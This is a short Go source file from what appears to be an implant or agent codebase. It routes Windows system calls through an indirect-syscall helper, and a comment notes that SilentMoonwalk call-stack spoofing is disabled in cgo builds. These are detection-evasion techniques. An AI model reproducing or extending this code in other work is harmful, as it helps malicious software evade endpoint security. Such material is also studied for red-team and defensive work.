//go:build windows && amd64 && cgo

package syscall

import "fmt"

// FIXME: SilentMoonwalk call-stack spoofing (lib/syscall/smw) is broken in
// cgo agents — the desync trampoline conflicts with cgo's stack/unwind
// model, so the spoofed path is disabled. All syscalls are routed through
// the pure-Go indirect syscall (executeSyscall), exactly like the non-cgo
// builds; see lib/syscall/smw for the disabled implementation.
func (table *SyscallTable) invokeSyscall(name string, args ...uintptr) (uint32, error) {
	info, found := table.GetSyscall(name)
	if !found {
		return 0, fmt.Errorf("system call %s not found in table", name)
	}
	return executeSyscall(info.SSN, table.selectGadget(), args), nil
}
